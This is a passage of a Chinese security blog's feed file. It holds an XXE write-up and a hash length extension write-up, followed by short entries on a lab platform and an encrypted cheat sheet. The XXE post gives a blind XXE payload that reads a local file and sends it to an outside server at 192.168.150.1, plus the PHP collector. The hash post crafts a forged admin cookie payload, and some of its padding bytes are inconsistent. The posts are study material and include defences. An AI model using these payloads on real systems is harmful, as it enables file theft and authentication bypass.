class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://192.168.150.1/evil.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta"> %all;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>evil.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://192.168.150.1/1.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="0x004-攻击测试"><a href="#0x004-攻击测试" class="headerlink" title="0x004 攻击测试"></a>0x004 攻击测试</h4><blockquote><p>攻击机：本机，靶机：服务器</p></blockquote><p>test.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xml</span>=<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="string">&lt;!ENTITY % file SYSTEM &quot;file:///E:/passwd.txt&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;!ENTITY % remote SYSTEM &quot;http://192.168.150.1/evil.xml&quot;&gt;</span></span><br><span class="line"><span class="string">%remote;</span></span><br><span class="line"><span class="string">%all;</span></span><br><span class="line"><span class="string">%send;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">EOF</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">simplexml_load_string</span>(<span class="variable">$xml</span>) ;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;&quot;</span> ;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$data</span>) ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>evil.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">all</span> <span class="string">&quot;&lt;!ENTITY % send SYSTEM &#x27;http://192.168.150.1/1.php?file=%file;&#x27;&gt;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;1.txt&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) ;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>攻击方法:</p><ul><li>模拟攻击者构造XXE请求：访问<code>http://localhost/test.php,</code> </li><li>然后存在漏洞的服务器会读出file的内容（E:&#x2F;1.txt）</li><li>通过带外通道发送给攻击者服务器上的1.php，</li><li>1.php做的事情就是把读取的数据保存到本地的1.txt中，</li><li>完成Blind XXE攻击。</li></ul><h4 id="0x005-一道CTF题看XXE"><a href="#0x005-一道CTF题看XXE" class="headerlink" title="0x005 一道CTF题看XXE"></a>0x005 一道CTF题看XXE</h4><p><a href="http://web.jarvisoj.com:9882/">访问题目链接</a></p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1740059-20190818233452458-1561182357.png" alt="img"></p><p>输入什么都无反应或回显</p><p>burp抓包</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1740059-20190818233657878-1103669329.png" alt="img"></p><p>我们把content-type改成application&#x2F;xml的类型，然后下方就可以写入xml代码，先用dtd内部注入看一下能执行不</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1740059-20190818233941190-1244545008.png" alt="img"></p><p>发现可以成功执行，外部实体注入的话这里没有服务器，不能够测试，那么直接外部注入看是否成功</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1740059-20190818234227415-2110516468.png" alt="img"></p><p>发现可以读取文件，那么直接读取home&#x2F;ctf&#x2F;flag.txt内容</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1740059-20190818234330209-726072620.png" alt="img"></p><p>flag读取成功！</p><h4 id="0x006-防御XXE攻击"><a href="#0x006-防御XXE攻击" class="headerlink" title="0x006 防御XXE攻击"></a>0x006 防御XXE攻击</h4><p>1.使用开发语言提供的禁用外部实体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">PHP：</span><br><span class="line">libxml_disable_entity_loader(true);</span><br><span class="line"></span><br><span class="line">JAVA:</span><br><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">Python：</span><br><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure><p>2.过滤用户提交的XML数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</span><br></pre></td></tr></table></figure><h4 id="0x007-判断是否存在XXE漏洞"><a href="#0x007-判断是否存在XXE漏洞" class="headerlink" title="0x007 判断是否存在XXE漏洞"></a>0x007 判断是否存在XXE漏洞</h4><p>1.检测XML是否会被解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;   </span><br><span class="line">&lt;!DOCTYPE ANY [       </span><br><span class="line">&lt;!ENTITY shit “this is shit”&gt;  </span><br><span class="line">]&gt;    </span><br><span class="line">&lt;root&gt;&amp;shit;&lt;/root&gt;  </span><br></pre></td></tr></table></figure><p>如果$shit;变成了”this is shit”，那就继续第二步。<br>2.检测服务器是否支持外部实体：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">&lt;!ENTITY % shit SYSTEM “http://yourhost/evil.xml”&gt;  </span><br><span class="line">%shit;  </span><br><span class="line">]&gt;  </span><br></pre></td></tr></table></figure><p>通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求evil.xml的HTTP request。<br>3.如果上面两步都支持，就看是否回显。如果能回显就直接引用外部实体注入。有时候服务器会不支持一般实体的引用，也就是在DTD之外无法引用实体，如果这样的话，只能使用Blind XXE攻击。<br>4.如果不能回显，就用<strong>Blind XXE攻击方法。</strong></p><h2 id="0x06-参考"><a href="#0x06-参考" class="headerlink" title="0x06 参考"></a>0x06 参考</h2><p><a href="https://blog.csdn.net/u011721501/article/details/43775691">https://blog.csdn.net/u011721501/article/details/43775691</a></p><p><a href="https://www.smi1e.top/dsada/">https://www.smi1e.top/dsada/</a></p><p><a href="https://www.cnblogs.com/-chenxs/p/11374614.html">https://www.cnblogs.com/-chenxs/p/11374614.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hash Length Extension Attack</title>
      <link href="/2020/05/17/Hash-Length-Extension-Attack/"/>
      <url>/2020/05/17/Hash-Length-Extension-Attack/</url>
      
        <content type="html"><![CDATA[<h2 id="0×01-前言"><a href="#0×01-前言" class="headerlink" title="0×01 前言"></a>0×01 前言</h2><p>哈希长度扩展攻击利用了 md5、sha1 等加密算法的缺陷，可以在不知道原始密钥的情况下来进行计算出一个对应的 hash 值。主要摘录于freebuf深入理解hash长度扩展攻击(sha1为例)、二向箔学院相关赛题wp知识点，本篇为自己在看文章时的见解，对难点或者语义含糊的地方有详细的解释。本篇重复提及的便是重难点。</p><h2 id="0×02-hash原理-sha1"><a href="#0×02-hash原理-sha1" class="headerlink" title="0×02 hash原理(sha1)"></a>0×02 hash原理(sha1)</h2><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/14335264155804.png!small" alt="img"></p><p><strong>当hash函数拿到需要被hash的字符串后，先将其字节长度整除64，取得余数。如果该余数正好等于56，那么就在该字符串最后添加上8个字节的长度描述符（具体用bit表示）。如果不等于56，就先对字符串进行长度填充，填充时第一个字节为hex(80)，其他字节均用hex(00)填充，填充至余数为56后，同样增加8个字节的长度描述符（该长度描述符为需要被hash的字符串的长度，不是填充之后整个字符串的长度）。</strong></p><p>以上过程，称之为补位。</p><blockquote><p>1b(字节)&#x3D;8bit(比特)</p></blockquote><p>补位完成后，字符串以64位一组进行分组（因为上面的余数为56,加上8个字节的长度描述符后，正好是64位，凑成一组）。字符串能被分成几组就会进行多少次“复杂的数学变化”。每次进行“复杂的数学变化”都会生成一组新的registers值供下一次“复杂的数学变化”来调用。第一次“复杂的数学变化”会调用程序中的默认值。当后面已经没有分组可以进行数学变化时，该组生成的registers值就是最后的hash值。</p><p><strong>在sha1的运算过程中，为确保同一个字符串的sha1值唯一，所以需要保证第一次registers的值也唯一。所以在sha1算法中，registers具有初始值。如上图中的registers值0。</strong></p><p>Hash值的随机性完全依赖于进行“复杂的数学变化”时输入的registers值和该次运算中字符串分组的数据。如果进行“复杂数学变化”时输入的registers值和该次运算的字符串分组相同，那么他们各自生成的新的registers值也相同。</p><h2 id="0×03-举例"><a href="#0×03-举例" class="headerlink" title="0×03 举例"></a>0×03 举例</h2><p>这里是 ISCC 中题目中的 admin.php 的算法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;auth&quot;</span>])) &#123;</span><br><span class="line">   <span class="variable">$auth</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;auth&quot;</span>]);</span><br><span class="line">   <span class="variable">$hsh</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;hsh&quot;</span>];</span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$hsh</span> !== <span class="title function_ invoke__">md5</span>(<span class="variable">$SECRET</span> . <span class="title function_ invoke__">strrev</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;auth&quot;</span>]))) &#123;    <span class="comment">//$SECRET is a 8-bit salt</span></span><br><span class="line">     <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="variable">$auth</span> = <span class="literal">false</span>;</span><br><span class="line">  <span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$auth</span>);</span><br><span class="line">  <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;auth&quot;</span>, <span class="variable">$s</span>);</span><br><span class="line">  <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;hsh&quot;</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$SECRET</span> . <span class="title function_ invoke__">strrev</span>(<span class="variable">$s</span>)));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>知道<code>md5($SECRET . strrev($_COOKIE[&quot;auth&quot;]))</code>的值</li><li>知道<code>$hsh</code>的值</li><li>可以算出另外一个 md5 值和另外一个 $hsh 的值，使得 <code>$hsh == md5($SECRET . strrev($_COOKIE[&quot;auth&quot;]))</code></li></ul><p>这样即可通过验证。如果要理解哈希长度扩展攻击，我们要先理解消息摘要算法的实现。拿 md5 算法举例。</p><h4 id="md5算法实现"><a href="#md5算法实现" class="headerlink" title="md5算法实现"></a>md5算法实现</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">对字符串abc的md5值计算,首先将其转化为16进制</span><br><span class="line">hex:</span><br><span class="line">61 62 63   abc</span><br></pre></td></tr></table></figure><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200517200204830.png" alt="image-20200517200204830"></p><h4 id="补位"><a href="#补位" class="headerlink" title="补位"></a>补位</h4><p>要想完成消息摘要算法的实现，必须对消息进行补位，使得其字节长度整除64(b，取得余数，且该余数正好等于56(b),换句话说：</p><p>消息字节长度 mod 64 * 8(bit) &#x3D;56 * 8(bit),即为消息字节长度在对 512 取模后的值为 448</p><p>前面提及对于补位，填充时第一个字节为hex(80)，其他字节均用hex(00)填充，填充至余数为56后，这是在16进制的情况下，在二进制下，简言之，在消息后加1，然后加无限个0，直到mod 64 * 8(bit) &#x3D;56 * 8(bit)</p><h4 id="补长度"><a href="#补长度" class="headerlink" title="补长度"></a>补长度</h4><p><code>abc</code>是 3 个字母，也就是 3 个字节，24 bit</p><p>前面提及，在补完位后增加8个字节的长度描述符（该长度描述符为需要被hash的字符串的长度，不是填充之后整个字符串的长度），即二进制24转化为十六进制0x18。18+7个00</p><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200517202004860.png" alt="image-20200517202004860"></p><blockquote><p><strong>MD5中存储的都是小端方式</strong></p><p>0x12345678</p><p>在MD5运算时候存储的顺序是</p><p>0x78563412</p></blockquote><p>故后八位读取顺序为0x0000000000000018</p><h4 id="计算消息摘要"><a href="#计算消息摘要" class="headerlink" title="计算消息摘要"></a>计算消息摘要</h4><p>计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit的消息（即64字节）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">A=0x67452301</span><br><span class="line">B=0xefcdab89</span><br><span class="line">C=0x98badcfe</span><br><span class="line">D=0x10325476</span><br></pre></td></tr></table></figure><p>经过一次消息摘要后，上面的链变量将会<strong>被新的值覆盖</strong>，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。</p><h4 id="具体计算细节"><a href="#具体计算细节" class="headerlink" title="具体计算细节"></a>具体计算细节</h4><p>将字符串和那四个链接变量经过一系列的复杂运算，算出一组新的A,B,C,D的值，如果消息小于512，只需要计算一次，这时候将新的ABCD的值按ABCD的顺序级联，然后输出，就是MD5的值，如果消息大于512的话，则需要计算多次，先计算出前512位的ABCD值然后用再用这个ABCD去计算后面512位的ABCD值以此类推，最后计算出来的ABCD经过拼接就是这串字符串的MD5值</p><h4 id="哈希长度扩展攻击的实现"><a href="#哈希长度扩展攻击的实现" class="headerlink" title="哈希长度扩展攻击的实现"></a>哈希长度扩展攻击的实现</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;secret.php&quot;</span>;</span><br><span class="line">@<span class="variable">$username</span>=(<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">enc</span>(<span class="params"><span class="variable">$text</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>.<span class="variable">$text</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">enc</span>(<span class="variable">$username</span>) === <span class="variable">$_COOKIE</span>[<span class="string">&#x27;verify&#x27;</span>])&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$username</span>, <span class="string">&quot;admin&quot;</span>)))&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;you are not admin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;verify&quot;</span>, <span class="title function_ invoke__">enc</span>(<span class="string">&quot;guest&quot;</span>), <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;len&quot;</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>), <span class="title function_ invoke__">time</span>()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">7</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>知道<code>md5($key+guest)</code>的值</li><li>知道<code>len($key)</code>的值</li><li>要使得<code>cookie == md5($key+$username)</code>且<strong>enc($username)&#x3D;&#x3D;&#x3D;enc(“guest”)，$username中要包含admin</strong></li></ul><p>问题就出在覆盖上。我们得知了其 hash 值，以及我们有一个可控的消息。而我们得到的 hash 值正是最后一轮摘要后的经过高地位互换的链变量。可以想像一下，<strong>在常规的摘要之后把我们的控制的信息进行下一轮摘要，只需要知道上一轮消息产生的链变量</strong>。</p><p>即此时的<code>COOKIE==md5($key+guest)</code>正是最后一轮摘要后的经过高地位互换的链变量，在常规的摘要之后把我们的控制的信息进行下一轮摘要变成最终的<code>COOKIE==md5(经过覆盖的链表量+admin)</code>,此处要覆盖的链表量就是<code>md5($key+guest)</code></p><p>COOKIE中，MD5($key.guest)&#x3D;f8d7a112644f7e71e1e8ad068f144f61,以及$key的长度为21。我们来进行哈希长度扩展攻击。</p><h4 id="长度扩展"><a href="#长度扩展" class="headerlink" title="长度扩展"></a>长度扩展</h4><p>补位：</p><p>由于$key的长度是21,故我们可以随便设一个值只要满足长度为21即可，接着是guest的十六进制，接着是补充够56个字节</p><p>补长度：</p><p>$key.guest&#x3D;21+5&#x3D;26位,故长度为26 * 8&#x3D;208bit,根据md5的存储方式，我们长度在hex下补为</p><p><code>08 20 00 00 00 00 00 00</code></p><p>代码要求 POST 的值要有 admin 这一字符串，所以添加一个 admin 在末尾作为拓展</p><p>去掉前面的假的 $key，得到最终的 $username。<br><code>guest\x80\x00\x00\x00\x00\x98\x01\x00\x00\x00\x00\x00\x00admin</code><br>urlencode之后为<br><code>guest%80%00%00%00%00%9%01%00%00%00%00%00%00admin</code></p><p>为了让判断成立，还需要计算出拓展之后的 cookie</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(enc($username) === $_COOKIE[&#x27;verify&#x27;])</span><br></pre></td></tr></table></figure><p>带入enc函数返回的就是md5($key+guest+admin)的值。<br>然后把md5($key+guest)值作为加密admin的初始链变量</p><p><strong>小端式存储要倒过来</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">MD5($key+guest)=f8d7a112 644f7e71 e1e8ad06 8f144f61</span><br><span class="line">A=0x12a1d7f8</span><br><span class="line">B=0x717e4f64</span><br><span class="line">c=0x06ade8e1</span><br><span class="line">d=0x614f148f</span><br></pre></td></tr></table></figure><p>用hashpump跑一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">hashpump</span></span><br><span class="line">Input Si gnature: f8d7a112644f7e71e1e8ad068f144f61</span><br><span class="line">Input Data: guest</span><br><span class="line">Input Key Length: 46</span><br><span class="line">Input Data to Add: admin</span><br><span class="line">得到的md5值</span><br><span class="line">guest\x80\x00\x00\x00\x00\x98\x01 \x00\x00\x00\x00\x00\x00admin </span><br></pre></td></tr></table></figure><p>最后抓包，将得到md5的值放到cookie中，同时post<code>username=guest\x80\x00\x00\x00\x00\x98\x01 \x00\x00\x00\x00\x00\x00admin </code> </p><p>url编码\x转化为%</p><p><code>guest%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%d0%00%00%00%00%00%00%00admin</code></p><h4 id="相关利用工具"><a href="#相关利用工具" class="headerlink" title="相关利用工具"></a>相关利用工具</h4><p><strong>hashpump</strong></p><p>在各种哈希算法中哈希长度扩展攻击的利用工具。</p><p>下载地址：<a href="https://github.com/bwall/HashPump"><strong>hashpump</strong></a></p><p><strong>hash_extender</strong></p><p>哈希扩展器</p><p>下载地址：<a href="https://github.com/iagox86/hash_extender">哈希扩展器</a></p><p><strong>md5-extension-attack</strong></p><p>MD5 长度扩展攻击工具</p><p>下载地址：<a href="https://github.com/JoyChou93/md5-extension-attack">MD5 长度扩展攻击工具</a></p><h2 id="0x04总结"><a href="#0x04总结" class="headerlink" title="0x04总结"></a>0x04总结</h2><p>解决问题的关键还是要理解它的具体计算细节，本篇的具体计算细节</p><blockquote><p>如果消息小于512，只需要计算一次，这时候将新的ABCD的值按ABCD的顺序级联，然后输出，就是MD5的值，如果消息大于512的话，则需要计算多次，先计算出前512位的ABCD值然后用再用这个ABCD去计算后面512位的ABCD值以此类推，最后计算出来的ABCD经过拼接就是这串字符串的MD5值</p></blockquote><p><strong>对于题目,我们得到的 hash 值正是最后一轮摘要后的经过高地位互换的链变量。在常规的摘要之后把我们的控制的信息进行下一轮摘要，只需要知道上一轮消息产生的链变量。<br>原本的md5($key+$username)小于512bit，直接用初始的链变量计算一次就计算出了md5值。题目要求enc($username)&#x3D;&#x3D;&#x3D;enc(“guest”)，而且$username中要包含admin。我们可以通过填充把username扩展超过512bit，让他进行两次计算，第二次计算使用到的链变量是第一次计算得到的md5($key+guest)覆盖掉原来的链变量让他作为加密admin的链变量，最后把cookie改为这个经过覆盖的链表量+admin的md5加密值。</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerabilities </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020HW Cheat Sheet</title>
      <link href="/2020/05/14/2020HW-Cheat-Sheet/"/>
      <url>/2020/05/14/2020HW-Cheat-Sheet/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="67f6741133da76d06598a68422ac72eadf1dac32555c1426a6350740788f6ad3"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> Notes </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>L0kiTown v1.0</title>
      <link href="/2020/05/13/L0kiTown-v1.0/"/>
      <url>/2020/05/13/L0kiTown-v1.0/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>I’ve always wanted to integrate a learning center, and finally managed to do it. The 1.0 version includes a penetration testing lab, penetration testing tools, a penetration testing target range, a network disk, and a resource sharing center. You can access it <a href="https://demo.l0ki.net/">here</a>.</p><h2 id="User-Guide"><a href="#User-Guide" class="headerlink" title="User Guide"></a>User Guide</h2><h3 id="KODBOX"><a href="#KODBOX" class="headerlink" title="KODBOX"></a>KODBOX</h3><p>The KODBOX module is for network disk and document collaboration, etc., and registration is required.<br><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200602205103699.png" alt="image-20200602205103699"></p><h3 id="Pentest-Lab"><a href="#Pentest-Lab" class="headerlink" title="Pentest Lab"></a>Pentest Lab</h3><p>The Pentest Lab module is for penetration testing labs, which is not open to the public for now and is only used for my personal learning.</p><h3 id="Share-Center"><a href="#Share-Center" class="headerlink" title="Share Center"></a>Share Center</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200602205213381.png" alt="image-20200602205213381"><br>The Share Center module is a sharing center, which includes a penetration testing target range, penetration testing tools, and a resource sharing center.</p><h4 id="Pentest-Ranges"><a href="#Pentest-Ranges" class="headerlink" title="Pentest Ranges"></a>Pentest Ranges</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143044397.png" alt="image-20200604143044397"><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143107832.png" alt="image-20200604143107832"><br>This is a penetration testing target range. This module integrates all usable target ranges and is for learning purposes only.</p><h4 id="Pentest-Tools"><a href="#Pentest-Tools" class="headerlink" title="Pentest Tools"></a>Pentest Tools</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143117977.png" alt="image-20200604143117977"><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143135098.png" alt="image-20200604143135098"><br>This is a penetration testing toolbox. This module integrates exploitable penetration testing tools. Among them, PocBox is produced by the MIST security team and can be used in conjunction with the DoraBox target range.</p><h4 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h4><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143157969.png" alt="image-20200604143157969"><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200604143210690.png" alt="image-20200604143210690"><br>This is a resource center. This module integrates downloadable PDF resources for learning, such as mini-program development, blue team system construction, etc.</p><h3 id="Contact-Me"><a href="#Contact-Me" class="headerlink" title="Contact Me"></a>Contact Me</h3><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/image-20200602205841633.png" alt="image-20200602205841633"><br>This module is my blog and can be used for learning and reference.</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>L0kiTown was initially intended for my personal use. If it helps others in their learning, I will continue to upgrade and optimize it. If you have any suggestions, please feel free to leave a comment.</p><h3 id="To-be-developed"><a href="#To-be-developed" class="headerlink" title="To be developed"></a>To be developed</h3><ul><li>Blog wiki, <a href="https://www.mi1k7ea.com/tags/">reference</a></li><li>Toolbox production</li><li>Introduction of local penetration tool jump links</li><li>ifream online code writing</li><li>Markdown parsing code</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>From Basics to Analysis with Wireshark</title>
      <link href="/2020/05/05/From-Basics-to-Analysis-with-Wireshark/"/>
      <url>/2020/05/05/From-Basics-to-Analysis-with-Wireshark/</url>
      
